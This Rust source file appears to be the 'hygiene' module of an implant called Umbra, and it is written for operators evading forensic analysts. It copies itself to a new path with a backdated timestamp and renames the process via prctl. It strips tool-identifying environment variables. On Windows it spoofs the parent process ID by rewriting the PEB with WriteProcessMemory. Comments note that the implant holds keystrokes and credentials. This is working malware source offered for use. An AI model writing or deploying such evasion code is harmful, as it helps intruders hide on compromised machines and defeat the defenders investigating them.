//! Memory and process hygiene.
//!
//! Two kinds of leftovers are worth nothing to the operator and everything
//! to the analyst:
//!
//!   * **memory**: the pre-shared key, the session keys, the keystrokes,
//!     the credentials and the module images.  They have to be in the
//!     process while the work happens, and they have to be gone the moment
//!     the work is done -- including on the paths where the work failed.
//!     The guard that does it is `crypto::Zeroizing`;
//!   * **process**: the name of the executable, the directory the process
//!     sits in, the environment it inherited and the parent it claims to
//!     have.  Every one of them is a free sentence about the implant.
//!
//! The module owns the second kind and describes the first; the beacon
//! owns the wiping of the first.

use std::fs;
use std::path::{Path, PathBuf};

use crate::upk::{self, Value};

// ---------------------------------------------------------------------------
// The memory
// ---------------------------------------------------------------------------

/// The sensitive material the implant holds, and what happens to it.
///
/// The report is not a promise about the whole process: it describes the
/// buffers the implant controls.  A heap that was freed and reused by
/// somebody else is not the implant's business any more.
pub fn report() -> String {
    let mut out = String::new();
    out.push_str("memory: the key material lives in guards that wipe themselves\n");
    out.push_str("memory: the pre-shared key and the session keys\n");
    out.push_str("memory: the keystrokes, the credentials and the module images\n");
    out.push_str("memory: the output of a task is wiped after it was sent\n");
    out.push_str("memory: a buffer that is not needed any more is wiped, not dropped\n");
    out
}

/// The buffers the implant wipes when it can.
///
/// The counters are the ones the beacon keeps: how many buffers were
/// wiped and how many bytes they held.
pub fn memory(args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut lines: Vec<String> = Vec::new();
    lines.push(report().trim_end().to_string());
    let wipe = args.bool_or("wipe", true);
    lines.push(format!(
        "memory: the idle buffers are {}",
        if wipe { "wiped" } else { "left alone" }
    ));
    let text = lines.join("\n") + "\n";
    let extra = vec![
        ("hygiene_memory", upk::bool_(wipe)),
        ("hygiene_report", upk::s(report().trim_end())),
    ];
    Ok((text, extra))
}

// ---------------------------------------------------------------------------
// The process
// ---------------------------------------------------------------------------

/// Copy the running implant to another place.
///
/// The copy keeps the permissions of the original and gets a timestamp
/// from the past: a file that was written five minutes ago in a directory
/// nobody looks at is less interesting than one that was created the
/// moment the implant started.
pub fn copy_self(target: &str) -> Result<String, String> {
    let source = std::env::current_exe().map_err(|e| format!("hygiene.process: {e}"))?;
    let path = PathBuf::from(target);
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).map_err(|e| format!("hygiene.process: {e}"))?;
        }
    }
    fs::copy(&source, &path).map_err(|e| format!("hygiene.process: {e}"))?;
    set_executable(&path)?;
    let _ = crate::persist::set_older_timestamp(&path);
    Ok(path.to_string_lossy().to_string())
}

/// Make the copy runnable.
#[cfg(unix)]
fn set_executable(path: &Path) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    let mut permissions = fs::metadata(path)
        .map_err(|e| format!("hygiene.process: {e}"))?
        .permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions).map_err(|e| format!("hygiene.process: {e}"))
}

/// Make the copy runnable.
#[cfg(not(unix))]
fn set_executable(_path: &Path) -> Result<(), String> {
    Ok(())
}

/// The name the process reports about itself.
///
/// The kernel keeps the name of a thread in a fixed buffer, and the tools
/// that list the processes show it.  It is not the name of the executable
/// -- that one is fixed at the moment the image is loaded -- but it is the
/// name most people read first.
pub fn set_process_name(name: &str) -> Result<(), String> {
    #[cfg(target_os = "linux")]
    {
        extern "C" {
            fn prctl(option: i32, ...) -> i32;
        }
        const PR_SET_NAME: i32 = 15;
        let bytes = name.as_bytes();
        // The kernel keeps at most fifteen bytes plus the terminator.
        let cut = &bytes[..bytes.len().min(15)];
        let result = unsafe { prctl(PR_SET_NAME, cut.as_ptr() as *const i8, 0, 0, 0) };
        if result != 0 {
            return Err("hygiene.process: the process name could not be set".to_string());
        }
        Ok(())
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = name;
        Err("hygiene.process: the process name can only be set on Linux".to_string())
    }
}

/// Remove everything from the environment that names the tool.
///
/// The implant is configured through the environment, and an environment
/// that says `UMBRA_SERVER=...` is a description of the implant written
/// in a place anybody may read.
pub fn clean_environment() -> Vec<String> {
    let mut removed: Vec<String> = Vec::new();
    let names: Vec<String> = std::env::vars().map(|(name, _)| name).collect();
    for name in names {
        if name.to_uppercase().contains("UMBRA") {
            // remove_var returns (), not a Result: there is no failure to
            // report, and the name is gone either way.
            std::env::remove_var(&name);
            removed.push(name);
        }
    }
    removed
}

/// The parent the process claims to have.
///
/// The operating system keeps the real parent in the process table; the
/// process itself keeps the one it inherited in its PEB.  Rewriting the
/// second changes what the tools that read the process block see, and
/// nothing else: the process tree of the system still shows the truth.
#[cfg(windows)]
pub fn spoof_parent(parent: u32) -> Result<u32, String> {
    use std::ffi::c_void;
    use std::os::raw::c_long;

    #[repr(C)]
    struct ProcessBasicInformation {
        exit_status: c_long,
        peb_base_address: *mut c_void,
        affinity_mask: usize,
        base_priority: c_long,
        unique_process_id: u32,
        inherited_from_unique_process_id: u32,
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GetCurrentProcessId() -> u32;
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        fn ReadProcessMemory(
            process: *mut c_void,
            address: *const c_void,
            buffer: *mut c_void,
            size: usize,
            read: *mut usize,
        ) -> i32;
        fn WriteProcessMemory(
            process: *mut c_void,
            address: *mut c_void,
            buffer: *const c_void,
            size: usize,
            written: *mut usize,
        ) -> i32;
        fn CloseHandle(handle: *mut c_void) -> i32;
    }

    #[link(name = "ntdll")]
    extern "system" {
        fn NtQueryInformationProcess(
            process: *mut c_void,
            class: u32,
            info: *mut c_void,
            length: u32,
            return_length: *mut u32,
        ) -> c_long;
    }

    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_VM_WRITE: u32 = 0x0020;

    let process = unsafe {
        OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            0,
            GetCurrentProcessId(),
        )
    };
    if process.is_null() {
        return Err("hygiene.process: the process could not be opened".to_string());
    }
    let mut info = ProcessBasicInformation {
        exit_status: 0,
        peb_base_address: std::ptr::null_mut(),
        affinity_mask: 0,
        base_priority: 0,
        unique_process_id: 0,
        inherited_from_unique_process_id: 0,
    };
    let status = unsafe {
        NtQueryInformationProcess(
            process,
            0,
            &mut info as *mut ProcessBasicInformation as *mut c_void,
            std::mem::size_of::<ProcessBasicInformation>() as u32,
            std::ptr::null_mut(),
        )
    };
    if status != 0 || info.peb_base_address.is_null() {
        unsafe { CloseHandle(process) };
        return Err("hygiene.process: the process information could not be read".to_string());
    }
    // The offset of the field inside the PEB.  It is fixed per
    // architecture, and the value that is read back is the check: if it
    // does not look like a process id, the offset is wrong for this
    // build of Windows and nothing is written.
    #[cfg(target_pointer_width = "64")]
    let offset: usize = 0x10;
    #[cfg(target_pointer_width = "32")]
    let offset: usize = 0x08;
    let address = (info.peb_base_address as usize + offset) as *const c_void;
    let mut current: u32 = 0;
    let mut read: usize = 0;
    let ok = unsafe {
        ReadProcessMemory(
            process,
            address,
            &mut current as *mut u32 as *mut c_void,
            4,
            &mut read,
        )
    };
    if ok == 0 || read != 4 {
        unsafe { CloseHandle(process) };
        return Err("hygiene.process: the parent could not be read".to_string());
    }
    let new_parent = parent;
    let mut written: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            process,
            address as *mut c_void,
            &new_parent as *const u32 as *const c_void,
            4,
            &mut written,
        )
    };
    unsafe { CloseHandle(process) };
    if ok == 0 || written != 4 {
        return Err("hygiene.process: the parent could not be written".to_string());
    }
    Ok(current)
}

/// The parent can only be rewritten on Windows.
#[cfg(not(windows))]
pub fn spoof_parent(_parent: u32) -> Result<u32, String> {
    Err("hygiene.process: the parent can only be rewritten on Windows".to_string())
}

/// The process hygiene of the implant.
///
/// Every step is optional and every step is reported: the operator wants
/// to know what the host looks like now, not what was attempted.
pub fn process(args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut lines: Vec<String> = Vec::new();
    let mut fields: Vec<(&'static str, Value)> = Vec::new();

    // The copy under a plausible name.
    let copy = args.str_or("copy", "");
    if !copy.is_empty() {
        let path = copy_self(&copy)?;
        lines.push(format!("the implant was copied to {path}"));
        fields.push(("hygiene_copy", upk::s(&path)));
    }

    // The name the process reports.
    let name = args.str_or("name", "");
    if !name.is_empty() {
        match set_process_name(&name) {
            Ok(()) => {
                lines.push(format!("the process reports the name {name}"));
                fields.push(("hygiene_name", upk::s(&name)));
            }
            Err(e) => lines.push(format!("the name was not set: {e}")),
        }
    }

    // The working directory.
    let cwd = args.str_or("cwd", "");
    if !cwd.is_empty() {
        std::env::set_current_dir(&cwd).map_err(|e| format!("hygiene.process: {e}"))?;
        lines.push(format!("the working directory is now {cwd}"));
        fields.push(("hygiene_cwd", upk::s(&cwd)));
    }

    // The environment.
    if args.bool_or("clean_env", false) {
        let removed = clean_environment();
        lines.push(format!(
            "the environment lost {} variable(s) that named the tool",
            removed.len()
        ));
        fields.push(("hygiene_env", upk::u(removed.len() as u64)));
    }

    // The parent the process claims to have.
    let ppid = args.u64_or("ppid", 0) as u32;
    if ppid > 0 {
        match spoof_parent(ppid) {
            Ok(previous) => {
                lines.push(format!("the process claims the parent {ppid} now"));
                fields.push(("hygiene_ppid", upk::u(ppid as u64)));
                fields.push(("hygiene_ppid_was", upk::u(previous as u64)));
            }
            Err(e) => lines.push(format!("the parent was not rewritten: {e}")),
        }
    }

    if lines.is_empty() {
        lines.push("nothing was changed: the task named no step".to_string());
    }
    fields.push(("hygiene_process", upk::bool_(true)));
    let text = lines.join("\n") + "\n";
    Ok((text, fields))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_memory_report_names_every_buffer() {
        let text = report();
        assert!(text.contains("key material"));
        assert!(text.contains("keystrokes"));
        assert!(text.ends_with('\n'));
    }

    #[test]
    fn the_environment_is_cleaned_of_the_tool() {
        std::env::set_var("UMBRA_TEST_MARKER", "1");
        let removed = clean_environment();
        assert!(removed.iter().any(|name| name == "UMBRA_TEST_MARKER"));
        assert!(std::env::var_os("UMBRA_TEST_MARKER").is_none());
    }

    #[test]
    fn the_process_task_reports_what_it_did() {
        let previous = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        let args = upk::map(vec![("cwd", upk::s("/tmp"))]);
        let (text, extra) = process(&args).unwrap();
        assert!(text.contains("working directory"));
        assert!(extra.iter().any(|(key, _)| *key == "hygiene_cwd"));
        // Put the working directory back, the test may run anywhere.
        let _ = std::env::set_current_dir(previous);
    }
}
